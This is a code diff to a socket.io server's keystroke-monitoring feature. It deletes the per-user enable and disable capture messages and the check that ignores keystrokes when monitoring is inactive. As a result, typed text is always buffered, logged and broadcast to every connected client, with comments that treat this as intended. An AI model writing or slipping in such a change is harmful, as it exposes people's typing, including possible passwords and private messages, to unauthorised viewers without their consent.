@@ -1515,14 +1515,6 @@ io.on("connection", (socket) => {
 
 			startKeystrokeMonitoring(team, targetUsername);
 
-			const onlineSocketIds = getOnlineSocketIdsForUser(team, targetUsername);
-			for (const targetSocketId of onlineSocketIds) {
-				io.to(targetSocketId).emit("enable_keystroke_capture", {
-					team,
-					targetUsername,
-				});
-			}
-
 			socket.emit("keystroke_monitoring_status", {
 				status: "started",
 				targetUsername,
@@ -1546,14 +1538,6 @@ io.on("connection", (socket) => {
 		}
 
 		stopKeystrokeMonitoring(team, targetUsername);
-
-		const onlineSocketIds = getOnlineSocketIdsForUser(team, targetUsername);
-		for (const targetSocketId of onlineSocketIds) {
-			io.to(targetSocketId).emit("disable_keystroke_capture", {
-				team,
-				targetUsername,
-			});
-		}
 
 		socket.emit("keystroke_monitoring_stopped", {
 			status: "stopped",
@@ -1579,15 +1563,9 @@ io.on("connection", (socket) => {
 			}
 
 			const key = getUserKey(team, username);
-			
-			if (!keystrokeMonitoringActive.get(key)) {
-				console.log(`[keystroke_data] Monitoring not active for ${key}`);
-				return; // Not being monitored, ignore
-			}
-
 			const keystrokeData = keystrokesByUser.get(key) || { buffer: "", lastUpdate: Date.now() };
 			
-			// Append keystroke to buffer
+			// Always append keystroke to buffer
 			keystrokeData.buffer += keyData;
 			keystrokeData.lastUpdate = Date.now();
 			
@@ -1600,7 +1578,7 @@ io.on("connection", (socket) => {
 
 			console.log(`[keystroke_data] Received from ${username}: "${keyData}", buffer length: ${keystrokeData.buffer.length}`);
 
-			// Broadcast current typing to dashboard viewers
+			// Always broadcast current typing to dashboard viewers (they'll filter if needed)
 			io.emit("user_typing_update", {
 				team,
 				username,
